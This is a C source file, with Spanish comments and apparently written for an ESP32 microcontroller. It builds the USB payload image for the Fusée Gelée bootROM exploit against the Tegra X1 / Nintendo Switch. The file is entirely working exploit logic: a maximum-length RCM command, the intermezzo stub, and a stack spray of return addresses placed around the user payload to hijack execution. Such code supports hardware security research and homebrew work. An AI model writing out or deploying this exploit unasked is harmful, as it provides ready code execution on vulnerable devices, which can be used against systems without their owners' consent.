// rcm.c - Construccion de la imagen RCM (fusee gelee) para Tegra X1 / Nintendo Switch.
//
// Replica exacta del armado que hace fusee-launcher:
//   - comando RCM de 680 bytes cuyo primer u32 es 0x30298 (longitud maxima)
//   - stub intermezzo de 124 bytes en 0x40010000
//   - payload partido en dos mitades alrededor del "stack spray"
//   - todo alineado a transferencias de 0x1000 bytes
//
// SPDX-License-Identifier: GPL-2.0-only

#include "rcm.h"

#include "intermezzo.h"

// Direcciones del bootROM del Tegra X1 (T210).
#define RCM_PAYLOAD_ADDR   0x40010000u  // destino del flujo RCM (tras el comando)
#define PAYLOAD_START_ADDR 0x40010E40u  // donde debe quedar el payload del usuario
#define STACK_SPRAY_START  0x40014E40u  // inicio del spray de direcciones
#define STACK_SPRAY_END    0x40017000u  // fin del spray

// Tamano del comando RCM: el bootROM lee 680 bytes del flujo y el resto lo
// copia a partir de RCM_PAYLOAD_ADDR.
#define RCM_CMD_SIZE 680u

// Offsets dentro del flujo RCM (lo que se envia por USB).
#define MSG_INTERMEZZO_OFF RCM_CMD_SIZE
#define MSG_PAYLOAD_OFF    (RCM_CMD_SIZE + (PAYLOAD_START_ADDR - RCM_PAYLOAD_ADDR))
#define MSG_SPRAY_OFF      (MSG_PAYLOAD_OFF + (STACK_SPRAY_START - PAYLOAD_START_ADDR))
#define MSG_PART2_OFF      (MSG_SPRAY_OFF + (STACK_SPRAY_END - STACK_SPRAY_START))

// Cantidad de payload que cabe antes del spray.
#define PAYLOAD_PART1_LEN (STACK_SPRAY_START - PAYLOAD_START_ADDR)

// El primer u32 del comando RCM, en little endian.
#define RCM_LENGTH_LE0 ((uint8_t)(RCM_MAX_IMAGE_SIZE & 0xFFu))
#define RCM_LENGTH_LE1 ((uint8_t)((RCM_MAX_IMAGE_SIZE >> 8) & 0xFFu))
#define RCM_LENGTH_LE2 ((uint8_t)((RCM_MAX_IMAGE_SIZE >> 16) & 0xFFu))
#define RCM_LENGTH_LE3 ((uint8_t)((RCM_MAX_IMAGE_SIZE >> 24) & 0xFFu))

esp_err_t rcm_image_init(rcm_image_t *img, const uint8_t *payload, size_t payload_len)
{
    if (img == NULL || payload == NULL || payload_len < RCM_MIN_PAYLOAD_SIZE) {
        return ESP_ERR_INVALID_ARG;
    }
    if (payload_len > RCM_MAX_PAYLOAD_SIZE) {
        return ESP_ERR_INVALID_SIZE;
    }

    // Si el payload no llena la primera mitad, esa zona se rellena con ceros
    // para que el stack spray quede siempre en 0x40014E40..0x40017000.
    const size_t part2_len = (payload_len > PAYLOAD_PART1_LEN)
                                 ? (payload_len - PAYLOAD_PART1_LEN)
                                 : 0;

    // El mensaje siempre termina en un limite de 0x1000 para que el bootROM
    // no vea un paquete corto y se quede esperando el resto del payload.
    size_t total = MSG_PART2_OFF + part2_len;
    total += RCM_CHUNK_SIZE - (total % RCM_CHUNK_SIZE);

    if (total > RCM_MAX_IMAGE_SIZE) {
        return ESP_ERR_INVALID_SIZE;
    }

    img->payload = payload;
    img->payload_len = payload_len;
    img->image_len = total;
    img->chunk_count = total / RCM_CHUNK_SIZE;
    return ESP_OK;
}

void rcm_image_chunk(const rcm_image_t *img, size_t index, uint8_t *out)
{
    const size_t base = index * RCM_CHUNK_SIZE;

    for (size_t i = 0; i < RCM_CHUNK_SIZE; i++) {
        const size_t pos = base + i;
        uint8_t value;

        if (pos < RCM_CMD_SIZE) {
            // Comando RCM: longitud maxima + relleno.
            switch (pos) {
            case 0: value = RCM_LENGTH_LE0; break;
            case 1: value = RCM_LENGTH_LE1; break;
            case 2: value = RCM_LENGTH_LE2; break;
            case 3: value = RCM_LENGTH_LE3; break;
            default: value = 0; break;
            }
        } else if (pos < MSG_INTERMEZZO_OFF + RCM_INTERMEZZO_LEN) {
            value = k_rcm_intermezzo[pos - MSG_INTERMEZZO_OFF];
        } else if (pos < MSG_PAYLOAD_OFF) {
            // Relleno entre el intermezzo y el payload.
            value = 0;
        } else if (pos < MSG_SPRAY_OFF) {
            // Primera mitad del payload.
            const size_t off = pos - MSG_PAYLOAD_OFF;
            value = (off < img->payload_len) ? img->payload[off] : 0;
        } else if (pos < MSG_PART2_OFF) {
            // Stack spray: u32 little endian con la direccion del payload.
            const unsigned shift = (unsigned)((pos - MSG_SPRAY_OFF) & 3u);
            value = (uint8_t)(RCM_PAYLOAD_ADDR >> (8u * shift));
        } else {
            // Segunda mitad del payload.
            const size_t off = PAYLOAD_PART1_LEN + (pos - MSG_PART2_OFF);
            value = (off < img->payload_len) ? img->payload[off] : 0;
        }

        out[i] = value;
    }
}
